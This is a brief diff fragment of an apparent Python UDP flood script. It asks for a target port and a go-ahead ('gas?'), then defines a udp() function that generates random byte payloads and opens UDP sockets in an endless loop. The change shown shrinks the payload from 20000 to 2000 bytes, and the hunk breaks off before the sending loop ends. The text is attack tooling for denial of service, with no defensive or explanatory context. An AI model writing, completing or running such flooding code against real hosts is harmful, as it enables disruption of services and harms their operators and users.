@@ -14,7 +14,7 @@ port = str(input("Port :"))
 choice = str(input("gas? :"))
 os.system("clear")
 def udp():
-	byte = os.urandom(20000)
+	byte = os.urandom(2000)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
